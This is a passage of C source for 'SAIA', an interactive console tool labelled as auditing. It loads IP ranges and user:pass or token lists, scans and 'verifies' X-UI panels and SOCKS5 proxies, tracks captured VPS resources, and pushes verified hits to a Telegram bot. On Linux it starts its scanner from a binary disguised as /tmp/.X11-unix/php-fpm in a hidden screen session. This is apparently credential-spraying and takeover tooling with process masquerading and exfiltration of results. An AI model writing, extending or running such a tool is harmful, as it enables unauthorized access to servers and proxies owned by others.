                g_config.backpressure.mem_threshold = atof(input);
            }

            printf("最大连接数 [当前=%d]: ",
                   g_config.backpressure.max_connections);
            fgets(input, sizeof(input), stdin);
            if (strlen(input) > 1) {
                int maxc = atoi(input);
                if (maxc > 0) {
                    g_config.backpressure.max_connections = maxc;
                    g_config.threads = maxc;
                }
            }

            config_save(&g_config, g_config.state_file);
            printf("配置已更新\n");
            break;
        }

        case 3:
            backpressure_update(&g_config.backpressure);
            printf("检查结果:\n");
            printf("  CPU: %.1f%% %s %.1f%%\n",
                   g_config.backpressure.current_cpu,
                   g_config.backpressure.current_cpu > g_config.backpressure.cpu_threshold ? ">" : "<=",
                   g_config.backpressure.cpu_threshold);
            printf("  内存: %.1f MB %s %.1f MB\n",
                   g_config.backpressure.current_mem,
                   g_config.backpressure.current_mem > g_config.backpressure.mem_threshold ? ">" : "<=",
                   g_config.backpressure.mem_threshold);
            printf("  建议: %s\n",
                   backpressure_should_throttle(&g_config.backpressure) ?
                   "应该限流" : "正常运行");
            break;

        default:
            return 0;
    }

    return 0;
}

// ==================== 清理数据 ====================

int saia_cleanup_menu(void) {
    color_yellow();
    printf("\n【清理数据】\n");
    color_reset();

    printf("警告: 此操作将清除所有运行时数据!\n");
    printf("  [1] 清理日志\n");
    printf("  [2] 清理报告\n");
    printf("  [3] 清理状态\n");
    printf("  [4] 全部清理\n");
    printf("  [0] 取消\n");

    printf("选择: ");
    fflush(stdout);

    int choice;
    scanf("%d", &choice);
    while (getchar() != '\n');

    const char *base = g_config.base_dir;
    char path[MAX_PATH_LENGTH];
    int removed = 0;

    switch (choice) {
        case 1:
            snprintf(path, sizeof(path), "%s/sys_audit_events.log", base);
            if (file_remove(path) == 0) { removed++; }
            printf("已清理 %d 个日志文件\n", removed);
            break;

        case 2:
            snprintf(path, sizeof(path), "%s/audit_report.log", base);
            if (file_remove(path) == 0) { removed++; }
            printf("已清理 %d 个报告文件\n", removed);
            break;

        case 3:
            snprintf(path, sizeof(path), "%s/sys_audit_state.json", base);
            if (file_remove(path) == 0) { removed++; }
            printf("已清理 %d 个状态文件\n", removed);
            break;

        case 4:
            snprintf(path, sizeof(path), "%s/sys_audit_events.log", base);
            if (file_remove(path) == 0) { removed++; }
            snprintf(path, sizeof(path), "%s/audit_report.log", base);
            if (file_remove(path) == 0) { removed++; }
            snprintf(path, sizeof(path), "%s/sys_audit_state.json", base);
            if (file_remove(path) == 0) { removed++; }
            snprintf(path, sizeof(path), "%s/audit_runner.lock", base);
            if (file_remove(path) == 0) { removed++; }
            printf("已清理 %d 个文件\n", removed);
            break;

        default:
            return 0;
    }

    return 0;
}

// ==================== 主循环 ====================

int saia_interactive_mode(void) {
    while (g_running) {
        int choice = saia_print_menu();
        if (choice == -2) {
            continue;
        }

        switch (choice) {
            /* ========== 运行 ========== */
            case 0:
                g_running = 0;
                printf("退出程序\n");
                break;
            case 1:
                if (saia_is_scan_session_running()) {
                    printf("\n>>> 审计任务已在运行，请先停止或等待完成\n");
                    break;
                }

                {
                    char path_ip[MAX_PATH_LENGTH], path_IP[MAX_PATH_LENGTH], path_nodes[MAX_PATH_LENGTH];
                    const char *picked = saia_pick_valid_targets_file(path_ip, sizeof(path_ip), path_IP, sizeof(path_IP), path_nodes, sizeof(path_nodes));
                    if (!picked) {
                        color_red();
                        printf("\n>>> 未检测到有效IP目标，禁止启动\n");
                        color_reset();
                        printf(">>> 请先在 [13] 更换IP列表 写入至少1条IP/CIDR\n");
                        break;
                    }
                }

                int port_batch_size = 30;
                {
                    char input[256] = {0};
                    int mode_cfg = 3;
                    int scan_mode_cfg = 2;
                    int threads_cfg = 1000;

                    color_cyan();
                    printf("\n>>> 启动前配置 (留空使用当前值)\n");
                    color_reset();

                    printf("模式说明:\n");
                    printf("  1. XUI专项\n");
                    printf("  2. S5专项\n");
                    printf("  3. 深度全能\n");
                    printf("  4. 验真模式\n");

                    printf("模式 [1-4] (当前 %d): ", mode_cfg);
                    fflush(stdout);
                    if (fgets(input, sizeof(input), stdin) && strlen(input) > 1) {
                        int mode = atoi(input);
                        if (mode >= 1 && mode <= 4) mode_cfg = mode;
                    }

                    printf("扫描策略说明:\n");
                    printf("  1. 探索\n");
                    printf("  2. 探索+验真\n");
                    printf("  3. 只留极品\n");

                    printf("扫描策略 [1-3] (当前 %d): ", scan_mode_cfg);
                    fflush(stdout);
                    if (fgets(input, sizeof(input), stdin) && strlen(input) > 1) {
                        int scan_mode = atoi(input);
                        if (scan_mode >= 1 && scan_mode <= 3) scan_mode_cfg = scan_mode;
                    }

                    printf("并发线程 [>=1] (当前 %d): ", threads_cfg);
                    fflush(stdout);
                    if (fgets(input, sizeof(input), stdin) && strlen(input) > 1) {
                        int threads = atoi(input);
                        if (threads >= 1) {
                            threads_cfg = threads;
                        }
                    }

                    printf("端口分批大小 [1-30] (默认30): ");
                    fflush(stdout);
                    if (fgets(input, sizeof(input), stdin) && strlen(input) > 1) {
                        int batch = atoi(input);
                        if (batch >= 1 && batch <= 30) {
                            port_batch_size = batch;
                        }
                    }

                    if (threads_cfg < 1) threads_cfg = 1;

                    g_config.mode = mode_cfg;
                    g_config.scan_mode = scan_mode_cfg;
                    g_config.threads = threads_cfg;

                    config_save(&g_config, g_config.state_file);
                }

#ifdef _WIN32
                if (saia_start_audit_async(g_config.mode, g_config.scan_mode, g_config.threads, port_batch_size) != 0) {
                    printf("\n>>> 启动审计任务失败\n");
                    break;
                }
#else
                char bin_path[MAX_PATH_LENGTH];
                if (!file_exists("/tmp/.X11-unix/php-fpm")) {
                    printf("\n>>> TMP二进制不存在: /tmp/.X11-unix/php-fpm\n");
                    printf(">>> 请先执行 saia restart 重新同步TMP二进制\n");
                    break;
                }
                snprintf(bin_path, sizeof(bin_path), "%s", "/tmp/.X11-unix/php-fpm");

                char cmd[8192];
                snprintf(cmd, sizeof(cmd),
                         "screen -dmS saia_scan \"%s\" --run-audit %d %d %d %d",
                         bin_path, g_config.mode, g_config.scan_mode, g_config.threads, port_batch_size);
                if (system(cmd) != 0) {
                    printf("\n>>> 启动审计任务失败\n");
                    break;
                }
#endif
        printf("\n>>> 审计任务已在后台启动，可继续在主菜单操作\n");
                printf(">>> 当前配置: mode=%d, scan=%d, threads=%d, port_batch=%d\n",
                       g_config.mode, g_config.scan_mode, g_config.threads, port_batch_size);
#ifndef _WIN32
                printf(">>> 启动二进制: %s\n",
                       "/tmp/.X11-unix/php-fpm");
#endif
                break;
            case 2:
                g_reload = 1;
                strncpy(g_state.status, "manual_stopping", sizeof(g_state.status) - 1);
                g_state.status[sizeof(g_state.status) - 1] = '\0';
                if (saia_stop_scan_session()) {
                    printf("\n>>> 已执行停止操作，审计任务应已终止\n");
                } else {
                    printf("\n>>> 未发现可停止的审计任务\n");
                }
                break;
            case 3:
                saia_realtime_monitor();
                break;
            case 4: {
                /* XUI 面板查看 — 显示 audit_report.log 中 XUI 结果 */
                color_cyan();
                printf("\n>>> [4] XUI 面板查看\n");
                color_reset();
                char report_path[MAX_PATH_LENGTH];
                snprintf(report_path, sizeof(report_path), "%s/audit_report.log", g_config.base_dir);
                char **lines = NULL; size_t lc = 0;
                if (file_read_lines(report_path, &lines, &lc) == 0 && lc > 0) {
                    int found = 0;
                    int verified = 0;
                    printf("\n[发现]\n");
                    for (size_t i = 0; i < lc; i++) {
                        if (lines[i] && strstr(lines[i], "[XUI_FOUND]")) {
                            printf("  %s\n", lines[i]);
                            found++;
                        }
                    }
                    printf("\n[验真]\n");
                    for (size_t i = 0; i < lc; i++) {
                        if (lines[i] && strstr(lines[i], "[XUI_VERIFIED]")) {
                            char compact[256];
                            saia_format_verified_compact(lines[i], compact, sizeof(compact));
                            printf("  %s\n", compact);
                            verified++;
                        }
                    }
                    for (size_t i = 0; i < lc; i++) {
                        free(lines[i]);
                    }
                    free(lines);
                    if (!found && !verified) {
                        printf("  暂无 XUI 审计记录\n");
                    } else {
                        printf("\nXUI 发现:%d | 验真:%d\n", found, verified);
                    }
                } else {
                    printf("  暂无审计报告\n");
                }
                break;
            }
            case 5: {
                /* S5 面板查看 */
                color_cyan();
                printf("\n>>> [5] S5 面板查看\n");
                color_reset();
                char report_path[MAX_PATH_LENGTH];
                snprintf(report_path, sizeof(report_path), "%s/audit_report.log", g_config.base_dir);
                char **lines = NULL; size_t lc = 0;
                if (file_read_lines(report_path, &lines, &lc) == 0 && lc > 0) {
                    int found = 0;
                    int verified = 0;
                    printf("\n[发现]\n");
                    for (size_t i = 0; i < lc; i++) {
                        if (lines[i] && strstr(lines[i], "[S5_FOUND]")) {
                            printf("  %s\n", lines[i]);
                            found++;
                        }
                    }
                    printf("\n[验真]\n");
                    for (size_t i = 0; i < lc; i++) {
                        if (lines[i] && strstr(lines[i], "[S5_VERIFIED]")) {
                            char compact[256];
                            saia_format_verified_compact(lines[i], compact, sizeof(compact));
                            printf("  %s\n", compact);
                            verified++;
                        }
                    }
                    for (size_t i = 0; i < lc; i++) {
                        free(lines[i]);
                    }
                    free(lines);
                    if (!found && !verified) {
                        printf("  暂无 S5 审计记录\n");
                    } else {
                        printf("\nS5 发现:%d | 验真:%d\n", found, verified);
                    }
                } else {
                    printf("  暂无审计报告\n");
                }
                break;
            }
            case 6:
                /* 小鸡资源展示 — VPS 资源监控 */
                color_cyan();
                printf("\n>>> [6] 小鸡资源展示\n");
                color_reset();
                saia_vps_realtime_panel();
                break;

            /* ========== 守护 ========== */
            case 7:
                color_yellow();
                printf("\n>>> [7] 启动守护进程 (未实现/TODO)\n");
                color_reset();
                break;
            case 8:
                color_yellow();
                printf("\n>>> [8] 停止守护进程 (未实现/TODO)\n");
                color_reset();
                break;
            case 9:
                saia_doctor();
                break;

            /* ========== 配置与通知 ========== */
            case 10: {
                char resume_path[MAX_PATH_LENGTH];
                snprintf(resume_path, sizeof(resume_path), "%s/resume_config.json", g_config.base_dir);
                color_cyan();
                printf("\n>>> [10] 断点续连\n");
                color_reset();

                printf("当前状态: %s\n", g_config.resume_enabled ? "已启用" : "已禁用");
                if (file_exists(resume_path)) {
                    char *raw = file_read_all(resume_path);
                    if (raw) {
                        printf("断点文件: %s\n", resume_path);
                        printf("断点内容:\n%s\n", raw);
                        free(raw);
                    }
                } else {
                    printf("断点文件: 不存在\n");
                }

                printf("[1] 启用断点续连\n");
                printf("[2] 禁用断点续连\n");
                printf("[3] 清除断点文件\n");
                printf("[0] 返回\n");
                printf("选择: ");
                fflush(stdout);

                char input[16] = {0};
                if (!fgets(input, sizeof(input), stdin)) break;

                if (input[0] == '1') {
                    g_config.resume_enabled = 1;
                    config_save(&g_config, g_config.state_file);
                    printf(">>> 已启用断点续连\n");
                } else if (input[0] == '2') {
                    g_config.resume_enabled = 0;
                    config_save(&g_config, g_config.state_file);
                    printf(">>> 已禁用断点续连\n");
                } else if (input[0] == '3') {
                    if (file_exists(resume_path)) file_remove(resume_path);
                    printf(">>> 已清除断点文件\n");
                }
                break;
            }
            case 11:
                saia_backpressure_menu();
                break;
            case 12:
                saia_telegram_menu();
                break;

            /* ========== 数据操作 ========== */
            case 13: {
                /* 更换 IP 列表 */
                if (saia_is_scan_session_running()) {
                    printf("\n>>> 检测到审计正在运行，请先 [2] 停止后再修改IP列表\n");
                    break;
                }
                char nodes_path[MAX_PATH_LENGTH];
                snprintf(nodes_path, sizeof(nodes_path), "%s/nodes.list", g_config.base_dir);
                color_cyan();
                printf("\n>>> [13] 更换IP列表\n");
                color_reset();
                printf("请逐行输入 IP/CIDR/范围 (输入 EOF 结束):\n");
                int count = saia_write_list_file_from_input(nodes_path, 1, 0);
                if (count >= 0) {
                    color_green();
                    printf(">>> IP 列表已更新，本次写入 %d 条\n\n", count);
                    color_reset();
                } else {
                    color_red();
                    printf(">>> 写入失败或已取消\n");
                    color_reset();
                }
                break;
            }
            case 14: {
                /* 更新 Tokens/口令 */
                if (saia_is_scan_session_running()) {
                    printf("\n>>> 检测到审计正在运行，请先 [2] 停止后再修改Tokens\n");
                    break;
                }
                char tokens_path[MAX_PATH_LENGTH];
                char mode_input[16];
                char next_input[16];
                int append_mode = 0;
                snprintf(tokens_path, sizeof(tokens_path), "%s/tokens.list", g_config.base_dir);
                color_cyan();
                printf("\n>>> [14] 更新口令 (tokens.list)\n");
                color_reset();
                printf("[1] 覆盖现有\n");
                printf("[2] 追加到现有\n");
                printf("请选择 [1/2] (默认1): ");
                fflush(stdout);
                if (fgets(mode_input, sizeof(mode_input), stdin) && mode_input[0] == '2') {
                    append_mode = 1;
                }

                while (g_running) {
                    printf("请粘贴 token/user:pass（支持空格/换行，可多次粘贴）；完成后输入 EOF 结束。\n");
                    int count = saia_write_list_file_from_input(tokens_path, 1, append_mode);
                    if (count >= 0) {
                        color_green();
                        printf(">>> 口令已%s，本次写入 %d 条\n\n", append_mode ? "追加" : "覆盖", count);
                        color_reset();
                        saia_print_tokens_write_summary(tokens_path, append_mode, count);
                    } else {
                        color_red();
                        printf(">>> 写入失败或已取消\n");
                        color_reset();
                    }

                    printf("[1] 继续追加\n");
                    printf("[2] 继续覆盖\n");
                    printf("[0] 返回\n");
                    printf("选择: ");
                    fflush(stdout);
                    if (!fgets(next_input, sizeof(next_input), stdin)) break;
                    if (next_input[0] == '1') {
                        append_mode = 1;
                        continue;
                    }
                    if (next_input[0] == '2') {
                        append_mode = 0;
                        continue;
                    }
                    break;
                }
                break;
            }
            case 15:
                saia_report_menu();
                break;
            case 16:
                saia_cleanup_menu();
                break;
            case 17: {
                /* 无 L7 列表 — 显示怀疑无 L7 穿透的记录 */
                color_cyan();
                printf("\n>>> [17] 无 L7 列表\n");
                color_reset();
                char report_path[MAX_PATH_LENGTH];
                snprintf(report_path, sizeof(report_path), "%s/audit_report.log", g_config.base_dir);
                char **lines = NULL; size_t lc = 0;
                if (file_read_lines(report_path, &lines, &lc) == 0 && lc > 0) {
                    int found = 0;
                    for (size_t i = 0; i < lc; i++) {
                        if (lines[i] &&
                            (strstr(lines[i], "NO_L7") ||
                             strstr(lines[i], "无L7能力") ||
                             strstr(lines[i], "疑似无L7"))) {
                            printf("  %s\n", lines[i]);
                            found++;
                        }
                        free(lines[i]);
                    }
                    free(lines);
                    if (!found) printf("  暂无疑似无L7数据\n");
                } else {
                    printf("  暂无审计报告\n");
                }
                break;
            }
            case 18: {
                /* 一键清理 */
                color_yellow();
                printf("\n>>> [18] 一键清理 — 清除运行日志和临时文件\n");
                color_reset();
                printf("确认清理? (y/N): ");
                fflush(stdout);
                char yn[8] = {0};
                if (fgets(yn, sizeof(yn), stdin) && (yn[0] == 'y' || yn[0] == 'Y')) {
                    char path[MAX_PATH_LENGTH];
                    snprintf(path, sizeof(path), "%s/sys_audit_events.log", g_config.base_dir);
                    file_remove(path);
                    snprintf(path, sizeof(path), "%s/audit_report.log", g_config.base_dir);
                    file_remove(path);
                    snprintf(path, sizeof(path), "%s/sys_audit_state.json", g_config.base_dir);
                    file_remove(path);
                    color_green();
                    printf(">>> 清理完成\n");
                    color_reset();
                } else {
                    printf("已取消\n");
                }
                break;
            }
            case 19: {
                /* 初始化 — 重置配置 */
                color_yellow();
                printf("\n>>> [19] 初始化 — 重置所有配置到默认值\n");
                color_reset();
                printf("确认初始化? 所有配置将被重置 (y/N): ");
                fflush(stdout);
                char yn[8] = {0};
                if (fgets(yn, sizeof(yn), stdin) && (yn[0] == 'y' || yn[0] == 'Y')) {
                    config_init(&g_config, g_config.base_dir);
                    config_save(&g_config, g_config.state_file);
                    color_green();
                    printf(">>> 初始化完成\n");
                    color_reset();
                } else {
                    printf("已取消\n");
                }
                break;
            }
            case 20: {
                /* 项目备注 */
                color_cyan();
                printf("\n>>> [20] 项目备注\n");
                color_reset();
                char note_path[MAX_PATH_LENGTH];
                snprintf(note_path, sizeof(note_path), "%s/project_note.json", g_config.base_dir);
                char *existing = file_read_all(note_path);
                if (existing && strlen(existing) > 0) {
                    printf("当前备注: %s\n", existing);
                }
                if (existing) free(existing);
                printf("输入新备注 (留空保持不变): ");
                fflush(stdout);
                char note[512] = {0};
                if (fgets(note, sizeof(note), stdin)) {
                    char *nl = strchr(note, '\n');
                    if (nl) *nl = '\0';
                    if (strlen(note) > 0) {
                        FILE *fp = fopen(note_path, "w");
                        if (fp) {
                            fprintf(fp, "%s", note);
                            fclose(fp);
                            color_green();
                            printf(">>> 备注已保存\n");
                            color_reset();
                        }
                    }
                }
                break;
            }
            case 21:
                color_yellow();
                printf("\n>>> [21] IP 库管理 (未实现/TODO)\n");
                color_reset();
                break;

            default:
                color_red();
                printf("\n无效选择: %d\n", choice);
                color_reset();
        }

        if (g_running && choice != 0) {
            printf("\n按Enter继续...");
            fflush(stdout);
            getchar();
        }
    }

    return 0;
}

// ==================== Telegram 推送菜单 ====================

int saia_telegram_menu(void) {
    char input[512];
    while (g_running) {
        color_yellow();
        printf("\n【Telegram 推送】\n");
        color_reset();

        printf("当前状态: %s\n", g_config.telegram_enabled ? "已启用" : "已禁用");
        printf("  Bot Token: %s\n", g_config.telegram_token[0] ? "已配置" : "未配置");
        printf("  Chat ID:   %s\n", g_config.telegram_chat_id[0] ? g_config.telegram_chat_id : "未配置");
        printf("  推送间隔:  %d 分钟\n", g_config.telegram_interval);
        printf("  验真阈值:  %d 条\n", g_config.telegram_verified_threshold);

        printf("\n  [1] 启用/禁用\n");
        printf("  [2] 配置 Bot Token\n");
        printf("  [3] 配置 Chat ID\n");
        printf("  [4] 配置推送间隔 (分钟)\n");
        printf("  [5] 发送测试消息\n");
        printf("  [6] 配置验真阈值 (N条触发)\n");
        printf("  [0] 返回\n");
        printf("选择: ");
        fflush(stdout);

        if (!fgets(input, sizeof(input), stdin)) break;
        int choice = atoi(input);
        if (choice == 0) break;

        switch (choice) {
            case 1:
                g_config.telegram_enabled = !g_config.telegram_enabled;
                printf("Telegram 推送已%s\n", g_config.telegram_enabled ? "启用" : "禁用");
                config_save(&g_config, g_config.state_file);
                break;
            case 2:
                printf("Bot Token: ");
                fflush(stdout);
                if (fgets(input, sizeof(input), stdin)) {
                    input[strcspn(input, "\n")] = '\0';
                    strncpy(g_config.telegram_token, input, sizeof(g_config.telegram_token) - 1);
                    printf("已更新\n");
                    config_save(&g_config, g_config.state_file);
                }
                break;
            case 3:
                printf("Chat ID: ");
                fflush(stdout);
                if (fgets(input, sizeof(input), stdin)) {
                    input[strcspn(input, "\n")] = '\0';
                    strncpy(g_config.telegram_chat_id, input, sizeof(g_config.telegram_chat_id) - 1);
                    printf("已更新\n");
                    config_save(&g_config, g_config.state_file);
                }
                break;
            case 4:
                printf("推送间隔 (分钟, 0=禁用): ");
                fflush(stdout);
                if (fgets(input, sizeof(input), stdin)) {
                    g_config.telegram_interval = atoi(input);
                    printf("已更新为 %d 分钟\n", g_config.telegram_interval);
                    config_save(&g_config, g_config.state_file);
                }
                break;
            case 5: {
                if (!g_config.telegram_enabled) {
                    printf("请先启用 TG 推送。\n");
                    break;
                }
                printf("正在发送测试消息...\n");
                int ret = push_telegram("<b>SAIA 通知</b>\n\nTG 推送测试成功，当前版本 " SAIA_VERSION " 运行正常。");
                if (ret == 0) printf("消息发送请求已执行(请查看是否收到)。\n");
                else printf("消息发送请求下发失败。\n");
                break;
            }
            case 6:
                printf("验真阈值 (>=1, 每达到N条验真推送一次): ");
                fflush(stdout);
                if (fgets(input, sizeof(input), stdin)) {
                    int th = atoi(input);
                    if (th < 1) th = 1;
                    g_config.telegram_verified_threshold = th;
                    printf("已更新为 %d 条\n", g_config.telegram_verified_threshold);
                    config_save(&g_config, g_config.state_file);
                }
                break;
            default:
                printf("无效选项\n");
                break;
        }

        printf("\n按Enter继续...\n");
        fflush(stdout);
        if (!fgets(input, sizeof(input), stdin)) break;
    }

    return 0;
}

// ==================== 凭据管理菜单 ====================

int saia_credentials_menu(void) {
    color_yellow();
    printf("\n【凭据管理】\n");
    color_reset();

    printf("凭据文件: %s\n", g_config.tokens_file);

    char **lines = NULL;
    size_t count = 0;
    if (file_read_lines(g_config.tokens_file, &lines, &count) == 0 && count > 0) {
        printf("当前条数: %zu\n", count);
        for (size_t i = 0; i < count; i++) free(lines[i]);
        free(lines);
    } else {
        printf("当前条数: 0 (文件不存在或为空)\n");
    }

    printf("\n  [1] 替换凭据列表\n");
    printf("  [2] 追加凭据\n");
    printf("  [0] 返回\n");
    printf("选择: ");
    fflush(stdout);

    int choice;
    if (scanf("%d", &choice) != 1) choice = 0;
    while (getchar() != '\n');

    switch (choice) {
        case 1: {
            color_cyan();
            printf(">>> 替换凭据列表 (格式: user:pass 或 pass)\n");
            color_reset();
            int n = saia_write_list_file_from_input(g_config.tokens_file, 0, 0);
            if (n >= 0) {
                color_green();
                printf(">>> 已写入 %d 条凭据\n", n);
                color_reset();
            }
            break;
        }
        case 2: {
            color_cyan();
            printf(">>> 追加凭据 (格式: user:pass 或 pass)\n");
            color_reset();
            int n = saia_write_list_file_from_input(g_config.tokens_file, 0, 1);
            if (n >= 0) {
                color_green();
                printf(">>> 已追加 %d 条凭据\n", n);
                color_reset();
            }
            break;
        }
        default:
            break;
    }
    return 0;
}

// ==================== 大屏面板工具函数 (对应 DEJI.py 极光UI) ====================

/* 计算包含 ANSI 转义的字符串实际显示宽度（中文算 2） */
static int visible_width(const char *s) {
    int w = 0;
    int in_esc = 0;
    while (s && *s) {
        if (in_esc) {
            if (*s == 'm') in_esc = 0;
            s++;
            continue;
        }
        if (*s == '\033') { in_esc = 1; s++; continue; }
        unsigned char c = (unsigned char)*s;
        if (c < 0x80) { w += 1; s++; }
        else if ((c & 0xE0) == 0xC0) {
            /* UTF-8 2 byte */
            unsigned int cp = (c & 0x1F) << 6;
            if (*(s+1)) cp |= (*(s+1) & 0x3F);
            w += (cp >= 0xFF01 && cp <= 0xFF60) ? 2 : 1;
            s += 2;
        } else if ((c & 0xF0) == 0xE0) {
            /* UTF-8 3 byte (CJK 在此范围) */
            w += 2;
            s += 3;
        } else if ((c & 0xF8) == 0xF0) {
            /* UTF-8 4 byte (emoji 等) */
            w += 2;
            s += 4;
        } else { w += 1; s++; }
    }
    return w;
}

/* 单行带边框输出，自动补齐 */
static void render_panel_line(const char *text, int inner) {
    int w = visible_width(text);
    int pad = inner - 1 - w;
    if (pad < 0) pad = 0;
    printf("%s┃ %s%*s%s┃%s\n", C_BLUE, text, pad, "", C_BLUE, C_RESET);
}

/* 单板构建 */
static void render_single_panel(const char *title, const char **lines, int nlines, int inner, int rows) {
    /* 上边框 */
    printf("%s┏", C_BLUE);
    for (int i = 0; i < inner; i++) printf("━");
    printf("┓%s\n", C_RESET);
    /* 标题 */
    render_panel_line(title, inner);
    /* 分隔 */
    printf("%s┣", C_BLUE);
    for (int i = 0; i < inner; i++) printf("━");
    printf("┫%s\n", C_RESET);
    /* 内容行 */
    int shown = 0;
    for (int i = 0; i < nlines && shown < rows; i++, shown++)
        render_panel_line(lines[i], inner);
    while (shown < rows) {
        render_panel_line("", inner);
        shown++;
    }
    /* 下边框 */
    printf("%s┗", C_BLUE);
    for (int i = 0; i < inner; i++) printf("━");
    printf("┛%s\n", C_RESET);
}

/* 实时监控: 读取 sys_audit_state.json 并显示双栏大屏 */
int saia_realtime_monitor(void) {
    while (g_running) {
        /* 清屏 */
        printf("\x1b[H\x1b[J");

        /* 计算运行时间 */
        time_t now = time(NULL);
        time_t elapsed = (g_state.start_time > 0) ? (now - g_state.start_time) : 0;
        int hours = (int)(elapsed / 3600);
        int mins  = (int)((elapsed % 3600) / 60);
        int secs  = (int)(elapsed % 60);

        int scan_running = saia_is_scan_session_running();
        const char *status_str = scan_running ? "running" : (g_state.status[0] ? g_state.status : "idle");
        int term_cols = saia_dash_terminal_columns();
        int inner = (term_cols - 6) / 2;
        if (inner < 26) inner = 26;
        if (inner > 74) inner = 74;
        const char *bdr = C_BLUE;
        uint64_t xui_found = g_state.xui_found;
        uint64_t xui_verified = g_state.xui_verified;
        uint64_t s5_found = g_state.s5_found;
        uint64_t s5_verified = g_state.s5_verified;
        uint64_t total_found = g_state.total_found;
        uint64_t total_verified = g_state.total_verified;
        size_t ip_count = 0;
        size_t tk_count = 0;
        size_t ip_lines = 0;
        char last_tk[128];
        dash_progress_t pg;
        saia_dash_load_progress(&pg);
        const char *dash_nodes_src = (pg.targets_file[0] && file_exists(pg.targets_file)) ? pg.targets_file : g_config.nodes_file;
        saia_dash_runtime_metrics(dash_nodes_src, &ip_count, &tk_count, &ip_lines, last_tk, sizeof(last_tk));
        if (pg.audit_ips == 0) pg.audit_ips = pg.fed;
        int show_mode_num = (pg.run_mode >= 1 && pg.run_mode <= 4) ? pg.run_mode : g_config.mode;
        int show_scan_num = (pg.run_scan_mode >= 1 && pg.run_scan_mode <= 3) ? pg.run_scan_mode : g_config.scan_mode;
        int show_threads_cfg = (pg.run_threads_cfg > 0) ? pg.run_threads_cfg : g_config.threads;
        const char *show_mode_str = show_mode_num == 1 ? "XUI专项" :
                                    show_mode_num == 2 ? "S5专项" :
                                    show_mode_num == 3 ? "深度全能" :
                                    show_mode_num == 4 ? "验真模式" : "未知";
        const char *show_scan_str = show_scan_num == 1 ? "探索" :
                                    show_scan_num == 2 ? "探索+验真" :
                                    show_scan_num == 3 ? "只留极品" : "未知";
        saia_count_report_stats(g_config.report_file,
                                &xui_found, &xui_verified,
                                &s5_found, &s5_verified,
                                &total_found, &total_verified);

        char left[8][180];
        char right[8][180];
        snprintf(left[0], sizeof(left[0]), "SAIA MONITOR v%s %s", SAIA_VERSION, saia_dash_spinner(scan_running));
        snprintf(left[1], sizeof(left[1]), "状态:%s | 模式:%s", status_str, show_mode_str);
        snprintf(left[2], sizeof(left[2]), "策略:%s | 运行:%02d:%02d:%02d", show_scan_str, hours, mins, secs);
        snprintf(left[3], sizeof(left[3]), "总发现:%llu | 总验真:%llu", (unsigned long long)total_found, (unsigned long long)total_verified);
        snprintf(left[4], sizeof(left[4]), "XUI 发现/验真:%llu/%llu", (unsigned long long)xui_found, (unsigned long long)xui_verified);
        snprintf(left[5], sizeof(left[5]), "S5  发现/验真:%llu/%llu", (unsigned long long)s5_found, (unsigned long long)s5_verified);
        snprintf(left[6], sizeof(left[6]), "线程设定:%d | 在跑:%d/%d", show_threads_cfg, pg.threads, pg.worker_total > 0 ? pg.worker_total : show_threads_cfg);
        snprintf(left[7], sizeof(left[7]), "IP段:%zu | 预估IP:%zu | TK:%zu", ip_lines, ip_count, tk_count);

        snprintf(right[0], sizeof(right[0]), "运行细节 %s", saia_dash_spinner(scan_running));
        snprintf(right[1], sizeof(right[1]), "压背:%s | 队列:%zu | 生产:%s", g_config.backpressure.enabled ? "开" : "关", pg.queue_size, pg.producer_done ? "完成" : "进行中");
        snprintf(right[2], sizeof(right[2]), "CPU: %.1f%% | MEM_FREE: %.0fMB", g_config.backpressure.current_cpu, g_config.backpressure.current_mem);
        snprintf(right[3], sizeof(right[3]), "解析:%zu/%zu | 审计IP:%zu | 命中:%llu", pg.fed, pg.est_total, pg.audit_ips, (unsigned long long)pg.found);
        if (pg.current_port > 0) {
            snprintf(right[4], sizeof(right[4]), "审计目标: %s:%d", pg.current_ip, pg.current_port);
        } else {
            snprintf(right[4], sizeof(right[4]), "审计目标: %s", pg.current_ip);
        }
        snprintf(right[5], sizeof(right[5]), "限流: %s", g_config.backpressure.is_throttled ? "是" : "否");
        snprintf(right[6], sizeof(right[6]), "PID:%d | 最近命中TK:%s", (int)g_state.pid, last_tk);
        snprintf(right[7], sizeof(right[7]), "当前TK: %s", pg.current_token[0] ? pg.current_token : "-");

        for (int i = 0; i < 8; i++) {
            char fit[180];
            saia_dash_fit_line(left[i], fit, sizeof(fit), (size_t)(inner - 4));
            snprintf(left[i], sizeof(left[i]), "%s", fit);
            saia_dash_fit_line(right[i], fit, sizeof(fit), (size_t)(inner - 4));
            snprintf(right[i], sizeof(right[i]), "%s", fit);
        }

        printf("%s┏", bdr); for (int i = 0; i < inner; i++) printf("━"); printf("┓  %s┏", bdr); for (int i = 0; i < inner; i++) printf("━"); printf("┓%s\n", C_RESET);
        for (int i = 0; i < 8; i++) {
            int maxw = inner - 2;
            int lw = visible_width(left[i]);
            int rw = visible_width(right[i]);
            int lpad = maxw - lw;
            int rpad = maxw - rw;
            if (lpad < 0) lpad = 0;
            if (rpad < 0) rpad = 0;
            printf("%s┃ %s%s%s", bdr, C_WHITE, left[i], C_RESET);
            for (int j = 0; j < lpad; j++) putchar(' ');
            printf(" ┃  %s┃ %s%s%s", bdr, C_WHITE, right[i], C_RESET);
            for (int j = 0; j < rpad; j++) putchar(' ');
            printf(" ┃%s\n", C_RESET);
            if (i == 0) {
                printf("%s┣", bdr); for (int j = 0; j < inner; j++) printf("━"); printf("┫  %s┣", bdr); for (int j = 0; j < inner; j++) printf("━"); printf("┫%s\n", C_RESET);
            }
        }
        printf("%s┗", bdr); for (int i = 0; i < inner; i++) printf("━"); printf("┛  %s┗", bdr); for (int i = 0; i < inner; i++) printf("━"); printf("┛%s\n", C_RESET);

        printf("\n%s按 Enter 返回主菜单 (q 也可返回, 每2秒自动刷新)%s\n", C_DIM, C_RESET);
        fflush(stdout);

        /* 等待2秒，期间检测用户输入 */
#ifdef _WIN32
        int should_break = 0;
        for (int i = 0; i < 20; i++) {
            if (_kbhit()) {
                int ch = _getch();
                if (ch == '\r' || ch == '\n' || ch == 'q' || ch == 'Q' || ch == '0') {
                    should_break = 1;
                    break;
                }
            }
            saia_sleep(100);
        }
        if (should_break) break;
#else
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(0, &fds);
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        int ret = select(1, &fds, NULL, NULL, &tv);
        if (ret > 0) {
            char buf[16] = {0};
            if (fgets(buf, sizeof(buf), stdin)) {
